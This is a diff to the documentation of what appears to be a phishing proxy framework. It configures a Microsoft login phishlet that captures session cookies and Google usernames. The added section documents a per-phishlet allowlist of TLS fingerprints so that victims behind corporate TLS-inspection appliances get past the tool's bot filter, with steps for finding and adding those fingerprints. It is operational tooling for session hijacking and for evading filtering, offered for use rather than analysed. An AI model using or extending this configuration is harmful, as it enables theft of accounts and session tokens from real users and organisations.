@@ -35,6 +35,9 @@ credentials:
     - {domain: login.live.com, keys: ['ESTSAUTHPERSISTENT'], type: auth}
 login:
   domain: login.microsoftonline.com
+bg_ja4_allow:                       # optional: per-phishlet botguard JA4 exceptions
+  - t13d1310c009130100              # (corporate TLS-inspection variants) — OR-merged
+  - t13d1311c009130100              # with the node-level -bg-ja4 allowlist
 auth_tokens:
   - domain: login.live.com
     keys: ['WLSSC', 'ESTSAUTHPERSISTENT']    # cookie-set that completes a session
@@ -62,6 +65,16 @@ auth_tokens:
   the landing page.
 - **Google's `f.req` username capture**: the email lives inside the JSON-RPC array, not a
   plain form field — capture by regex over the POST body.
+
+## Per-phishlet botguard JA4 exceptions
+
+`bg_ja4_allow` (optional list of JA4 prefixes, min 4 lowercase-alphanumeric chars)
+whitelists TLS fingerprints for **this phishlet only** — OR-merged with the
+node-level `-bg-ja4` flag list. Use it when a corporate SWG (Umbrella, Palo Alto)
+re-terminates TLS so victims arrive with the appliance's fingerprint instead of
+Chrome's: read the variant from `journalctl` (`JA4 not in allowlist`) and add it
+here — hot-reload applies immediately, no service restart, no unit edit.
+A match logs `JA4 allowed by phishlet exception (<phishlet>)` for visibility.
 
 ## Token-gated lures
 
